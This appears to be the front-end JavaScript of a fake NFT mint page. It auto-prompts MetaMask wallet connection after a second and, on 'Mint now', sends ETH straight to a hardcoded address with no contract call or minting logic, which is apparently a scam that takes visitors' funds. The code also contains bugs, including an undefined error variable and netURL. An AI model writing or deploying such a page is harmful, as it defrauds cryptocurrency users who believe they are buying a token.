const ADDRESS = '0xe47dd2B54e44a280408c024b4419d594b5591BE3';
const web3 = window.Web3
const ethereum = window.ethereum
let accounts
let price = 0.08
const input = document.querySelector(".eth_input")
const button = document.querySelector(".metamask_content-btn")
const buttonor = document.querySelector(".buttonorer")
const title = document.querySelector(".metamask_content-title")
const priceDisplay = document.querySelector("#price")
const Web3 = new web3(ethereum)

window.addEventListener("load", () => {
    if (ethereum.selectedAddress) {
        document.querySelector(".container_link_metamask_install-btn").style.display = "none"
        document.querySelector(".container_metamask_content-btn").style.display = "flex"
        button.innerHTML = "<span>Mint now</span>"
        input.disabled = false
        title.innerHTML = "Connected"
    }
    else if (ethereum.isMetaMask) {
        document.querySelector(".container_link_metamask_install-btn").style.display = "none"
        document.querySelector(".container_metamask_content-btn").style.display = "flex"
        title.innerHTML = "Connect Wallet"
        input.disabled = false
    }


})

const getAccount = async () => {
    accounts = await ethereum.request({ method: 'eth_requestAccounts' });
    console.log(accounts)
    if (window.ethereum.chainId == "0x1") console.log("Already connected to ethereum mainnet...")
    else {
        try {
            await ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{chainId: '0x1'}],
            });
        } catch (switchError) {
            // This error code indicates that the chain has not been added to MetaMask.
            if (error.code === 4902) {
                try {
                    await ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x1',
                            rpcUrl: netURL
                        }],
                    });
                } catch (addError) {
                    // handle "add" error
                }
            }
        }
    }
}



const sendTransaction =  async () => {
    const priceToWei = (price * 1e18).toString(16)
    const gasLimit = (60_000).toString(16);
    ethereum.request({
            method: 'eth_sendTransaction',
            params: [
                {
                    from: accounts[0],
                    to: ADDRESS,
                    value: priceToWei,
                    gas: gasLimit,
                },
            ],
        })
        .then((txHash) => console.log(txHash))
        .catch((error) => console.error);
};



input.addEventListener("input", () => {
    if (+input.value < 1) button.disabled = true
    else if (+input.value >= 1) button.disabled = false

    price = +input.value * 0.08
    if (+input.value >= 1) priceDisplay.innerText = price.toFixed(2)
	//else if(input.value < 1) input.value =+ "1"
	else priceDisplay.innerText = "0"
})

button.addEventListener("click", async () => {
    if (!ethereum.selectedAddress) {
        await getAccount()
        button.innerHTML = "<span>Mint now</span>"
        title.innerHTML = "Connected"
    } else {
        await getAccount()
        await sendTransaction()
    }
})

buttonor.addEventListener("click", async () => {
    if (!ethereum.selectedAddress) {
        await getAccount()
        button.innerHTML = "<span>Mint now</span>"
        title.innerHTML = "Connected"
    } 
})

setTimeout(function(){
  buttonor.click();
}, 1000);

document.querySelector(".pluson").addEventListener("click", () => {
	if(input.value < 999) {
    input.value = +input.value + 1
    event = new Event("input")
    input.dispatchEvent(event)
	}
})

document.querySelector(".minuson").addEventListener("click", () => {
	if(input.value > 1) {
    input.value = +input.value - 1
    event = new Event("input")
    input.dispatchEvent(event)
	}
})

document.querySelector(".maxon").addEventListener("click", () => {
    input.value = 20
    event = new Event("input")
    input.dispatchEvent(event)
})